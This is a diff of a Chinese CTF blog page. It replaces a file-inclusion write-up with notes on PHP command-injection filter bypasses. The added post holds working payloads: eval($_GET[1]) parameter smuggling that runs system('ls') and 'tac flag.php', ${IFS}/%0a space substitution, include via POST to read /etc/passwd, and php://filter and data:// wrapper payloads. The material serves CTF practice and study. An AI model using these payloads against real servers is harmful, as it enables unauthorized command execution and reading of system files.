@@ -20,24 +20,21 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta name="description" content="我们看向这个题目的页面  他提示我们传入一个file，也就是我们可以直接在url里面进行get传参，我们传入一个url?file&#x3D;1看看会返回什么  提示我们flag在flag.php里面，我们首先可以想到的是文件包含，然后我们看到了代码的第二行，allow_url_include:on 我们可以联想到php伪协议，这样我们就可以得到这一道题目的思路了。 使用php:&#x2F;&amp;#x2">
+  <meta name="description" content="system绕过：可以使用passthru等函数绕过 二次传递：通过传两个参数来绕过检测12?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&amp;#x27;ls&amp;#x27;);?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&amp;#x27;tac flag.php&amp;#x27;);  过滤了空格可以用${IFS}和%0a 代替，分号可以用?&gt;代替但是过滤了括号之后就不能">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web-include">
-<meta property="og:url" content="http://example.com/2023/01/29/include/index.html">
+<meta property="og:title" content="命令执行">
+<meta property="og:url" content="http://example.com/2023/10/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/index.html">
 <meta property="og:site_name" content="Dvgd">
-<meta property="og:description" content="我们看向这个题目的页面  他提示我们传入一个file，也就是我们可以直接在url里面进行get传参，我们传入一个url?file&#x3D;1看看会返回什么  提示我们flag在flag.php里面，我们首先可以想到的是文件包含，然后我们看到了代码的第二行，allow_url_include:on 我们可以联想到php伪协议，这样我们就可以得到这一道题目的思路了。 使用php:&#x2F;&amp;#x2">
+<meta property="og:description" content="system绕过：可以使用passthru等函数绕过 二次传递：通过传两个参数来绕过检测12?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&amp;#x27;ls&amp;#x27;);?c&#x3D;eval($_GET[1]);&amp;1&#x3D;system(&amp;#x27;tac flag.php&amp;#x27;);  过滤了空格可以用${IFS}和%0a 代替，分号可以用?&gt;代替但是过滤了括号之后就不能">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/web-include/1620.png">
-<meta property="og:image" content="http://example.com/images/web-include/1620-16749591749692.png">
-<meta property="og:image" content="http://example.com/images/web-include/1620-16749592011614.png">
-<meta property="og:image" content="http://example.com/images/web-include/1620-16749592431156.png">
-<meta property="article:published_time" content="2023-01-29T02:24:16.000Z">
-<meta property="article:modified_time" content="2023-05-09T07:37:19.726Z">
+<meta property="og:image" content="http://example.com/images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDI3MTMx,size_16,color_FFFFFF,t_70.png">
+<meta property="article:published_time" content="2023-10-03T09:21:26.000Z">
+<meta property="article:modified_time" content="2023-10-03T11:59:59.240Z">
 <meta property="article:author" content="Dvgd">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/web-include/1620.png">
+<meta name="twitter:image" content="http://example.com/images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDI3MTMx,size_16,color_FFFFFF,t_70.png">
 
-<link rel="canonical" href="http://example.com/2023/01/29/include/">
+<link rel="canonical" href="http://example.com/2023/10/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
 
 <script id="page-configurations">
@@ -50,7 +47,7 @@
   };
 </script>
 
-  <title>web-include | Dvgd</title>
+  <title>命令执行 | Dvgd</title>
   
 
 
@@ -135,7 +132,7 @@
   </li>
         <li class="menu-item menu-item-archives">
 
-    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">52</span></a>
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档<span class="badge">53</span></a>
 
   </li>
   </ul>
@@ -166,7 +163,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/01/29/include/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/03/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/Dvgd.jpg">
@@ -179,7 +176,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          web-include
+          命令执行
         </h1>
 
         <div class="post-meta">
@@ -188,16 +185,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-01-29 10:24:16" itemprop="dateCreated datePublished" datetime="2023-01-29T10:24:16+08:00">2023-01-29</time>
+              <time title="创建时间：2023-10-03 17:21:26 / 修改时间：19:59:59" itemprop="dateCreated datePublished" datetime="2023-10-03T17:21:26+08:00">2023-10-03</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2023-05-09 15:37:19" itemprop="dateModified" datetime="2023-05-09T15:37:19+08:00">2023-05-09</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -226,22 +217,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>我们看向这个题目的页面</p>
-<p><img src="/../images/web-include/1620.png" alt="img"></p>
-<p>他提示我们传入一个file，也就是我们可以直接在url里面进行get传参，我们传入一个url?file&#x3D;1看看会返回什么</p>
-<p><img src="/../images/web-include/1620-16749591749692.png" alt="img"></p>
-<p>提示我们flag在flag.php里面，我们首先可以想到的是文件包含，然后我们看到了代码的第二行，allow_url_include:on</p>
-<p>我们可以联想到php伪协议，这样我们就可以得到这一道题目的思路了。</p>
-<p>使用php:&#x2F;&#x2F;filter读取到flag.php，将flag.php以base64的形式给显示出来，这样的话我们可以这样构造我们的payload</p>
-<p>url?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
-<p>我们来解读一下上面的payload：</p>
-<p>首先我们要传入file关键字的GET参数传递，php:&#x2F;&#x2F;是一种协议名称，php:&#x2F;&#x2F;filter是一种访问本地文件的协议，&#x2F;read&#x3D;convert.base64-encode表示的是读取的方式是base64编码后resouce&#x3D;flag.php表示目标文件为flag.php</p>
-<p>也就是说，flag.php最终会以base64的形式显示出来，我们最后使用base64解码就可以了。</p>
-<p>理论存在，实践开始：</p>
-<p>我们使用上面的payload</p>
-<p><img src="/../images/web-include/1620-16749592011614.png" alt="img"></p>
-<p>然后我们得到了一段base64，我们使用base64解密，因该就可以得到答案了</p>
-<p><img src="/../images/web-include/1620-16749592431156.png" alt="img"></p>
+        <p>system绕过：可以使用passthru等函数绕过</p>
+<h4 id="二次传递：通过传两个参数来绕过检测"><a href="#二次传递：通过传两个参数来绕过检测" class="headerlink" title="二次传递：通过传两个参数来绕过检测"></a>二次传递：通过传两个参数来绕过检测</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br><span class="line">?c=<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="number">1</span>]);&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac flag.php&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>过滤了空格可以用${IFS}和%0a 代替，分号可以用?&gt;代替<br>但是过滤了括号之后就不能用带有括号的函数，php中include是可以不带括号的函数，和web31一样，这里需要用文件包含</p>
+<p>require可以替代incldue</p>
+<p>所以构造的Payload是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：http:<span class="comment">//url/?c=include%0a$_POST[1]?&gt; </span></span><br></pre></td></tr></table></figure>
+
+<p>然后再POST某个文件名就可以查看文件了，比如下图，我传的参数是 1&#x3D;&#x2F;etc&#x2F;passwd<br><img src="/../images/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1NDI3MTMx,size_16,color_FFFFFF,t_70.png" alt="在这里插入图片描述"></p>
+<p>可以通过php伪协议读取文件内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/read=convert.base64-encode/resource=flag.php</span></span><br></pre></td></tr></table></figure>
+
+<p>data伪协议</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(data:<span class="comment">//text/plain,&lt;?php system(&quot;tac fla*&quot;); ?&gt;)</span></span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -257,12 +247,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/01/29/web-include/" rel="prev" title="web-include">
-      <i class="fa fa-chevron-left"></i> web-include
+    <a href="/2023/09/18/off-by-one/" rel="prev" title="off_by_one">
+      <i class="fa fa-chevron-left"></i> off_by_one
     </a></div>
       <div class="post-nav-item">
-    <a href="/2023/02/01/bp%E7%88%86%E7%A0%B4/" rel="next" title="web-基础认证">
-      web-基础认证 <i class="fa fa-chevron-right"></i>
+    <a href="/2023/10/04/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="next" title="反序列化">
+      反序列化 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
@@ -322,6 +312,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BA%8C%E6%AC%A1%E4%BC%A0%E9%80%92%EF%BC%9A%E9%80%9A%E8%BF%87%E4%BC%A0%E4%B8%A4%E4%B8%AA%E5%8F%82%E6%95%B0%E6%9D%A5%E7%BB%95%E8%BF%87%E6%A3%80%E6%B5%8B"><span class="nav-number">1.</span> <span class="nav-text">二次传递：通过传两个参数来绕过检测</span></a></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -337,7 +328,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">52</span>
+          <span class="site-state-item-count">53</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
